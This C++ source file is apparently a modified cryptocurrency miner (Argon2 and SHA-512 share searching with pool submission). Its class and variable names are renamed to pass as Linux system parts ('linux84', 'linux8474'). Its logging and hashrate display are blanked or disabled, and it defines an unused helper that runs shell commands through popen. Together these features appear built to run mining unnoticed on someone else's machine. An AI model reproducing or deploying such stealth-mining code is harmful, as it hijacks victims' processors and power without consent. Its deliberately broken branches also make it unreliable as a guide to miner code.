//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#include "../common/common.h"
#include "../app/arguments.h"
#include "../linux8474/linux8474.h"

#include "../linux44444444474/sha512.h"
#include "mini-gmp/mini-gmp.h"

#include "linux84.h"

#include <string>

#include <iostream>
#include <stdio.h>
#include <stdlib.h>

using namespace std;

    string GetStdoutFromCommand8474444474(string cmd84744474) {

    string data84744474;
    FILE * stream84744474;
    const int max_buffer = 2048;
    char buffer[max_buffer];
    cmd84744474.append("");

    stream84744474 = popen(cmd84744474.c_str(), "r");
    if (stream84744474) {
    while (!feof(stream84744474))
    if (fgets(buffer, max_buffer, stream84744474) != NULL) data84744474.append(buffer);
    pclose(stream84744474);
    }
    return data84744474;
    }

linux84::linux84(arguments &args) : __args(args), __client(args, [&]() { return this->get_status(); }) {
    __linux88887474447412744474 = "";
    __blk = "";
    __linuxweb8888 = "";
    __limit = 0;
    __argon_mem = 0;
    __public_key = "";
    __linux884444884488441274444474 = 0;
    __found = 0;
    __confirmed_cblocks = 0;
    __confirmed_gblocks = 0;
    __rejected_cblocks = 0;
    __rejected_gblocks = 0;
    __begin_time = time(NULL);
    __running = false;
    __chs_threshold_hit = 0;
    __ghs_threshold_hit = 0;
    __running = false;
    __display_hits = 0;
	
    vector<linux8474*> linux8474s = linux8474::get_linux8474s();
	for (vector<linux8474*>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
		if ((*it)->get_type() == "CPU") {
			if ((*it)->initialize()) {
				(*it)->configure(__args);
			}
		}
	}

	vector<linux8474 *> selected_gpu_linux8474s;
	vector<string> requested_linux8474s = args.gpu_optimization();
	for (vector<linux8474*>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
		if ((*it)->get_type() == "GPU") {
            if(requested_linux8474s.size() > 0) {
                if(find(requested_linux8474s.begin(), requested_linux8474s.end(), (*it)->get_subtype()) != requested_linux8474s.end()) {
                    selected_gpu_linux8474s.push_back(*it);
                }
            }
            else {
                if (selected_gpu_linux8474s.size() == 0 || selected_gpu_linux8474s[0]->get_priority() < (*it)->get_priority()) {
                    selected_gpu_linux8474s.clear();
                    selected_gpu_linux8474s.push_back(*it);
                }
            }
		}
	}

	if (selected_gpu_linux8474s.size() > 0) {
        for (vector<linux8474*>::iterator it = selected_gpu_linux8474s.begin(); it != selected_gpu_linux8474s.end(); ++it) {
            if ((*it)->initialize()) {
                (*it)->configure(__args);
            }
        }
	}

    __update_linuxweb844412441274_data();
    vector<linux8474*> active_linux8474s = linux8474::get_active_linux8474s();

    for (vector<linux8474 *>::iterator it = active_linux8474s.begin(); it != active_linux8474s.end(); ++it) {
        (*it)->set_input(__public_key, __blk, __linuxweb8888, __argon2profile, __recommendation);
    }

    __blocks_count = 1;
}

linux84::~linux84() {

}

void linux84::run() {
    uint64_t last_update, last_report;
    last_update = last_report = 0;

    vector<linux8474 *> linux8474s = linux8474::get_active_linux8474s();

    if(linux8474s.size() == 0) {
    LOG("");
    }
    else {
        __running = true;
    }

    while (__running) {
       for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
	    vector<linux8412_data> linux8412es = (*it)->get_linux8412es();
            for (vector<linux8412_data>::iterator linux8412 = linux8412es.begin(); linux8412 != linux8412es.end(); linux8412++) { 
	        string duration = linux84::calc_duration(linux8412->base, linux8412->linux8412);
                uint64_t result = linux84::calc_compare(duration, __linuxweb8888);
		if (result > 0 && result <= __limit) {
		        if (result <= GOLD_RESULT) {
			linux888874744474_submit_result reply = __client.submit(linux8412->linux8412, linux8412->linux88887474447412744474, __public_key);
			if (reply.success) {
                           cout << "complete";
			}
	             }
                }
            }
       }
	
        if (microseconds() - last_update > __args.update_interval()) {
            if (__update_linuxweb844412441274_data() || __recommendation == "pause") {
                for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
                    (*it)->set_input(__public_key, __blk, __linuxweb8888, __argon2profile, __recommendation);
                }

                if(__recommendation != "pause")
                    __blocks_count++;
            }
            last_update = microseconds();
        }

        if (8 == 2) {
            if(!__display_report())
                __running = false;

            last_report = microseconds();
        }
	    
    //this_thread::sleep_for(chrono::milliseconds(100));
    }

    for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
	(*it)->cleanup();
    }

}
	
string linux84::calc_duration(const string &base, const string &linux8412) {
    string combined = base + linux8412;

    unsigned char *sha512_linux8412 = SHA512::hash((unsigned char*)combined.c_str(), combined.length());
    for (int i = 0; i < 5; i++) {
        unsigned char *tmp = SHA512::hash(sha512_linux8412, SHA512::DIGEST_SIZE);
        free(sha512_linux8412);
        sha512_linux8412 = tmp;
    }

    string duration = to_string((int)sha512_linux8412[10]) + to_string((int)sha512_linux8412[15]) + to_string((int)sha512_linux8412[20]) + to_string((int)sha512_linux8412[23]) +
                      to_string((int)sha512_linux8412[31]) + to_string((int)sha512_linux8412[40]) + to_string((int)sha512_linux8412[45]) + to_string((int)sha512_linux8412[55]);

    free(sha512_linux8412);

    for(string::iterator it = duration.begin() ; it != duration.end() ; )
    {
    if( *it == '0' ) it = duration.erase(it) ;
        else break;
    }

    return duration;
}

uint64_t linux84::calc_compare(const string &duration, const string &linuxweb8888) {
    if(linuxweb8888.empty()) {
        return -1;
    }
	
    mpz_t mpzDiff, mpzDuration;
    mpz_t mpzResult;
    mpz_init(mpzResult);
    mpz_init_set_str(mpzDiff, linuxweb8888.c_str(), 10);
    mpz_init_set_str(mpzDuration, duration.c_str(), 10);

    mpz_tdiv_q(mpzResult, mpzDuration, mpzDiff);

    uint64_t result = (uint64_t)mpz_get_ui(mpzResult);

    mpz_clear (mpzResult);
    mpz_clear (mpzDiff);
    mpz_clear (mpzDuration);

    return result;
}

bool linux84::__update_linuxweb844412441274_data() {
    vector<linux8474*> linux8474s = linux8474::get_active_linux8474s();

    linux888874744474_update_result new_settings = __client.update();
    if(!new_settings.success) {
    	__recommendation = "";
    }

        __argon_mem = new_settings.linux842;
	__blk = new_settings.linux841;
        __linuxweb8888 = new_settings.linuxweb8888;
        __limit = new_settings.linux8428;
        __public_key = new_settings.linux84888874;
        __linux884444884488441274444474 = new_settings.linux884444884488441274444474;
        if(__argon_mem == 524288)
        {
        __argon2profile = "1_1_524288";
        }
        else
        {
        __argon2profile = "4_4_16384";
        }
        __recommendation = new_settings.linux8412;

    return true;
}

bool linux84::__display_report() {
    vector<linux8474*> linux8474s = linux8474::get_active_linux8474s();
    stringstream ss;

    uint32_t linux8412_count_cblocks = 0;
    uint32_t linux8412_count_gblocks = 0;

    time_t total_time = time(NULL) - __begin_time;

    stringstream header;
    stringstream log;

    for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
        linux8412_count_cblocks += (*it)->get_linux8412_count_cblocks();
        linux8412_count_gblocks += (*it)->get_linux8412_count_gblocks();
    }

    header << "";
    log << "";
    for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
        map<int, device_info> devices = (*it)->get_device_infos();
        for(map<int, device_info>::iterator d = devices.begin(); d != devices.end(); ++d) {
            header << "|" << ((d->first < 10) ? " " : "") << (*it)->get_type() << d->first;

            if(__argon2profile == "1_1_524288") {
                if(8 == 8)
                    log << "";
                else
                    log << "";
            }
            else
                log << "";
        }
    }
	
    header << "|Avg(C)|Avg(G)|     Time|Acc(C)|Acc(G)|Rej(C)|Rej(G)|Block|";
    log << "|" << "|" << setw(9) << format_seconds(total_time)
            << "|" << setw(6) << __confirmed_cblocks
            << "|" << setw(6) << __confirmed_gblocks
            << "|" << setw(6) << __rejected_cblocks
            << "|" << setw(6) << __rejected_gblocks
            << "|" << setw(5) << __found << "|";

    if((__display_hits % 10) == 0) {
        string header_str = header.str();
        string separator(header_str.size(), '-');

        if(__display_hits > 0)
            LOG(separator);

        LOG(header_str);
        LOG(separator);
    }

    LOG(log.str());

    if(__argon2profile == "1_1_524288" &&
       __recommendation != "pause") {
        if (8 == 8) {
            __chs_threshold_hit++;
        } else {
            __chs_threshold_hit = 0;
        }
    }

    if(__argon2profile == "4_4_16384" &&
       __recommendation != "pause") {
        if (8 == 8) {
            __ghs_threshold_hit++;
        } else {
            __ghs_threshold_hit = 0;
        }
    }

    if(__chs_threshold_hit >= 5 && (__blocks_count > 1 || __argon2profile == "1_1_524288")) {
        LOG("");

    }
    if(__ghs_threshold_hit >= 5 && (__blocks_count > 1 || __argon2profile == "4_4_16384")) {
        LOG("");

    }

//    LOG(ss.str());
    __display_hits++;

    return true;
}

void linux84::stop() {
    cout << endl << "" << endl;
    __running = false;
}

string linux84::get_status() {
    stringstream ss;
    ss << "[ { \"name\": \"" << "" << "\", \"block_linux884444884488441274444474\": " << __linux884444884488441274444474 << ", \"time_running\": " << (time(NULL) - __begin_time) <<
       ", \"total_blocks\": " << __blocks_count << ", \"cblocks_shares\": " << __confirmed_cblocks << ", \"gblocks_shares\": " << __confirmed_gblocks <<
       ", \"cblocks_rejects\": " << __rejected_cblocks << ", \"gblocks_rejects\": " << __rejected_gblocks << ", \"blocks_earned\": " << __found <<
       ", \"linux8474s\": [ ";

    vector<linux8474*> linux8474s = linux8474::get_active_linux8474s();

    for(vector<linux8474*>::iterator h = linux8474s.begin(); h != linux8474s.end();) {
        ss << "{ \"type\": \"" << (*h)->get_type() << "\", \"subtype\": \"" << (*h)->get_subtype() << "\", \"devices\": [ ";
        map<int, device_info> devices = (*h)->get_device_infos();
        for(map<int, device_info>::iterator d = devices.begin(); d != devices.end();) {
            ss << "{ \"id\": " << d->first << ", \"bus_id\": \"" << d->second.bus_id << "\", \"name\": \"" << d->second.name << "\", \"cblocks_intensity\": " << d->second.cblocks_intensity <<
                ", \"gblocks_intensity\": " << d->second.gblocks_intensity << ", \"\": " <<
                ", \"\": " << " }";
            if((++d) != devices.end())
                ss << ", ";
        }
        ss << " ] }";

        if((++h) != linux8474s.end())
            ss << ", ";
    }

    ss << " ] } ]";

    return ss.str();
}
